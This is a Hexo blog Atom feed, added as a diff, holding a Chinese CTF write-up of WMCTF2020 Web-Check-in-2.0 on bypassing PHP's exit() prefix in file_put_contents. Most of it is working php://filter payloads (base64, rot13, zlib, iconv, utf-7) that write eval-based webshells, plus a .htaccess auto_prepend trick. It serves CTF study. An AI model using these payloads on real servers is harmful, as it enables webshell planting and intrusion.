@@ -1,0 +1,249 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;phpexit绕过&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-11-05T08:17:08.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <category term="willphp2.2" />
+    <category term="ssti-smarty3.1.39" />
+    <category term="./htaccess文件上传" />
+    <category term="php未解析" />
+    <category term="利用环境变量构造bash命令" />
+    <category term="利用.htaccess构成后门" />
+    <category term="通过php_value来设置preg_macth正则回溯次数" />
+    <category term="java反序列化" />
+    <category term="伪随机数" />
+    <category term="mysql" />
+    <category term="信息搜集（js，网络）" />
+    <category term="异或" />
+    <category term="密码爆破" />
+    <category term="sqlmap使用" />
+    <category term="SQL注入" />
+    <category term="文件包含" />
+    <category term="php伪协议" />
+    <category term="pearcmd文件包含" />
+    <category term="xpath注入" />
+    <category term="Padding oracle attack 与CBC翻转字节攻击" />
+    <category term="php" />
+    <category term="sql盲注" />
+    <category term="php7.4" />
+    <category term="FFI预处理" />
+    <category term="thinkphp3.2.4" />
+    <category term="jwt" />
+    <category term="sql二次注入" />
+    <category term="MD5碰撞" />
+    <category term="jwt密码爆破" />
+    <category term="cms" />
+    <category term="create_function()函数" />
+    <category term="sqlע��" />
+    <category term="jwt身份验证" />
+    <category term="rc4" />
+    <category term="CRLF" />
+    <category term="任意文件读取" />
+    <category term="PDO堆叠注入" />
+    <category term="test" />
+    <category term="tag2" />
+    <category term="shell反弹" />
+    <category term="phpexit绕过" />
+    <category term="require_once函数" />
+    <entry>
+        <id>http://odiws.github.io/2024/11/05/WMCTF2020-Web-Check-in-2-0/</id>
+        <title>[WMCTF2020]Web-Check-in-2.0</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/11/05/WMCTF2020-Web-Check-in-2-0/"/>
+        <content type="html">&lt;h2 id=&#34;wmctf2020web-check-in-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wmctf2020web-check-in-20&#34;&gt;#&lt;/a&gt; [WMCTF2020]Web-Check-in-2.0&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051618781.png&#34; alt=&#34;image-20241105161800311&#34;&gt;&lt;/p&gt;
+&lt;p&gt;给了源码，给了沙箱，给了这个 file_put_contents 写文件函数，基本上就是 php 死亡 exit 函数绕过了，还有几个禁用的过滤器，但是还是要写一下完整版的 exit 函数绕过&lt;/p&gt;
+&lt;h4 id=&#34;php-的-exit函数绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-的-exit函数绕过&#34;&gt;#&lt;/a&gt; php 的 exit（）函数绕过&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这个知识点其实已经有师傅将的很详细了，本着好记性不如烂笔头的原则，先记下来自己测试一下，免得以后忘了&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;需要绕过 exit () 的地方一般都是 &lt;code&gt;file_put_contents&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;以前只见过 &lt;code&gt;file_put_contents($filename,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);&lt;/code&gt;  这种形式，但其实还有另外两种，题目还是做少了&lt;/p&gt;
+&lt;p&gt;大致有如下三种&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;file_put_contents($filename,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);
+file_put_contents($content,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);
+file_put_contents($filename,$content . &amp;quot;\nxxxxxx&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;tips：伪协议处理时会对过滤器 urldecode 一次；面对不可用的规则是报个 Warning，然后跳过继续执行&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;第一种情况&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一种情况&#34;&gt;#&lt;/a&gt; 第一种情况&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;file_put_contents($filename,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;base64编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#base64编码绕过&#34;&gt;#&lt;/a&gt; base64 编码绕过&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;filename=php://filter/convert.base64-decode/resource=shell.php
+content=aPD9waHAgcGhwaW5mbygpOz8+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;利用 &lt;code&gt;php://filter&lt;/code&gt; ，先将内容进行解码后再写入文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt; base64 编码后为 &lt;code&gt;aPD9waHAgcGhwaW5mbygpOz8+&lt;/code&gt; ，至于为什么前面要加个 &lt;code&gt;a&lt;/code&gt; ，是因为 base64 解码以 4 个字节为 1 组转换为 3 个字节，前面的 &lt;code&gt;&amp;lt;?php exit();&lt;/code&gt;  符合 base64 编码的只有 &lt;code&gt;phpexit&lt;/code&gt;  这 7 个字节，因此添加一个字节来满足编码&lt;/p&gt;
+&lt;p&gt;最终效果如下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051628818.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;rot13编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rot13编码绕过&#34;&gt;#&lt;/a&gt; rot13 编码绕过&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;filename=php://filter/convert.string.rot13/resource=shell.php
+content=&amp;lt;?cuc cucvasb();?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;原理同上，因为不用考虑前面字符长度，更为方便&lt;/p&gt;
+&lt;p&gt;[&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051629232.png&#34; alt=&#34;image-20241105162931162&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但有局限性，如果开启了短标签的话，前面内容就会解析，导致代码错误&lt;/p&gt;
+&lt;h4 id=&#34;过滤器嵌套绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤器嵌套绕过&#34;&gt;#&lt;/a&gt; 过滤器嵌套绕过&lt;/h4&gt;
+&lt;p&gt;一种 payload【&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
+content=?&amp;gt;PD9waHAgcGhwaW5mbygpOz8+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;string.strip_tags&lt;/code&gt;  可以过滤掉 html 标签和 php 标签里的内容，然后再进行 base64 解码&lt;/p&gt;
+&lt;p&gt;效果如下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051629970.png&#34; alt=&#34;image-20241105162954902&#34;&gt;&lt;/p&gt;
+&lt;p&gt;需要注意的是 &lt;code&gt;string.strip_tags&lt;/code&gt;  在 php7.3.0 以上的环境下会发生段错误，从而导致无法写入，php5 则不受影响&lt;/p&gt;
+&lt;p&gt;另外一种 payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php
+content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&amp;gt;&amp;lt;?php%0dphpinfo();?&amp;gt;/resource=s1mple.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;先进行压缩，再转小写，再解压，最后可以非常巧合的发现目的代码并没有发生改变&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051630098.png&#34; alt=&#34;image-20241105163016034&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但是我本地测试的时候发现这串代码并不能执行，很奇怪，也许是哪个的地方的配置不对&lt;/p&gt;
+&lt;h4 id=&#34;htaccess的预包含利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#htaccess的预包含利用&#34;&gt;#&lt;/a&gt; .htaccess 的预包含利用&lt;/h4&gt;
+&lt;p&gt;自定义包含 flag 文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;filename=php://filter/write=string.strip_tags/resource=.htaccess
+content=?&amp;gt;php_value auto_prepend_file D:\\phpstudy_pro\\www\\flag.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;因为 &lt;code&gt;string.strip_tags&lt;/code&gt; ，所以依旧只能在 php5 下使用&lt;/p&gt;
+&lt;p&gt;但这里我也没成功，提示我不能使用 &lt;code&gt;php_value&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051630278.png&#34; alt=&#34;image-20241105163036203&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;第二种情况&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第二种情况&#34;&gt;#&lt;/a&gt; 第二种情况&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;file_put_contents($content,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;rot13编码绕过-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rot13编码绕过-2&#34;&gt;#&lt;/a&gt; rot13 编码绕过&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;content=php://filter/string.rot13|&amp;lt;?cuc cucvasb();?&amp;gt;|/resource=shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;结果如下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051630532.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如果 &lt;code&gt;rot&lt;/code&gt;  被过滤了的话可以考虑二次编码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
+$char = &#39;r&#39;; #构造r的二次编码 
+for ($ascii1 = 0; $ascii1 &amp;lt; 256; $ascii1++) &amp;#123; 
+    for ($ascii2 = 0; $ascii2 &amp;lt; 256; $ascii2++) &amp;#123; 
+        $aaa = &#39;%&#39;.$ascii1.&#39;%&#39;.$ascii2; 
+        if(urldecode(urldecode($aaa)) == $char)&amp;#123; 
+            echo $char.&#39;: &#39;.$aaa; 
+            echo &amp;quot;\n&amp;quot;; 
+        &amp;#125; 
+    &amp;#125; 
+&amp;#125; 
+?&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;过滤器嵌套绕过-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤器嵌套绕过-2&#34;&gt;#&lt;/a&gt; 过滤器嵌套绕过&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&amp;gt;&amp;lt;?php%0deval($_GET[1]);?&amp;gt;/resource=shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;原理同上&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051631711.png&#34; alt=&#34;image-20241105163126611&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;base64编码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#base64编码&#34;&gt;#&lt;/a&gt; base64 编码&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;content=php://filter/string.strip_tags|convert.base64-decode/resource=?&amp;gt;PD9waHAgcGhwaW5mbygpOz8+/../shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;因为 base64 在遇到 &lt;code&gt;=&lt;/code&gt;  后就结束了，因此可以先用 &lt;code&gt;string.strip_tags&lt;/code&gt;  来去掉前面 php 标签里的内容，然后剩下的进行 base64 解码即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051631254.png&#34; alt=&#34;image-20241105163142209&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;converticonv&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#converticonv&#34;&gt;#&lt;/a&gt; convert.iconv.*&lt;/h4&gt;
+&lt;p&gt;convert.iconv.* 过滤器等同于用 &lt;code&gt;iconv()&lt;/code&gt;  函数&lt;/p&gt;
+&lt;p&gt;通过 usc-2 的编码进行转换；对目标字符串进行 2 位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&amp;lt;hp phpipfn(o;)&amp;gt;?/resource=shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051632786.png&#34; alt=&#34;image-20241105163213634&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过 usc-4 的编码进行转换；对目标字符串进行 2 位一反转&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo iconv(&amp;quot;UCS-2LE&amp;quot;,&amp;quot;UCS-2BE&amp;quot;,&#39;&amp;lt;?php @eval($_POST[1234]);?&amp;gt;&#39;);
+content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&amp;lt;e@ p(lavOP_$1[TS]432&amp;gt;?;)/resource=shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051632658.png&#34; alt=&#34;image-20241105163253540&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用 utf【-8 转为 utf-7&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;=&lt;/code&gt;  转化为了 &lt;code&gt;+AD0-&lt;/code&gt; ，因此可以结合 base64 来绕过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php @eval($_POST[123456789]);?&amp;gt;`base64后为`PD9waHAgQGV2YWwoJF9QT1NUWzEyMzQ1Njc4OV0pOz8+`，utf-7后为`PD9waHAgQGV2YWwoJF9QT1NUWzEyMzQ1Njc4OV0pOz8+-
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;最终 payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;content=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|aaaaaaPD9waHAgQGV2YWwoJF9QT1NUWzEyMzQ1Njc4OV0pOz8+|/resource=shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051633223.png&#34; alt=&#34;image-20241105163321132&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;第三种情况&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第三种情况&#34;&gt;#&lt;/a&gt; 第三种情况&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;file_put_contents($filename,$content . &amp;quot;\nxxxxxx&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这种就很简单了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;filename=shell.php
+content=&amp;lt;?php phpinfo();?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051633326.png&#34; alt=&#34;image-20241105163336259&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但如果过滤了 php 及起始结束符号的话，就要考虑写.htaccess&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;filename&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;htaccess&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;content&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;php_value auto_prepend_file &lt;span class=&#34;token constant&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;\\phpstudy_pro\\www\\flag&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;php&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;\&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;转载链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94aWFvbG9uZzIyMzMzLnRvcC9hcmNoaXZlcy8xMTQv&#34;&gt;https://xiaolong22333.top/archives/114/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;回归题目：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051634262.png&#34; alt=&#34;image-20241105163432072&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用 POST 下面的两条命令两条一个周期就行了，这个好像运行一次就会删除&lt;/p&gt;
+&lt;p&gt;参考题目链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mdXNodWxpbmcuY29tL2luZGV4LnBocC8yMDIyLzExLzEwL3dtY3RmMjAyMHdlYi1jaGVjay1pbi0yLTAv&#34;&gt;https://fushuling.com/index.php/2022/11/10/wmctf2020web-check-in-2-0/&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="phpexit绕过" />
+        <updated>2024-11-05T08:17:08.000Z</updated>
+    </entry>
+</feed>
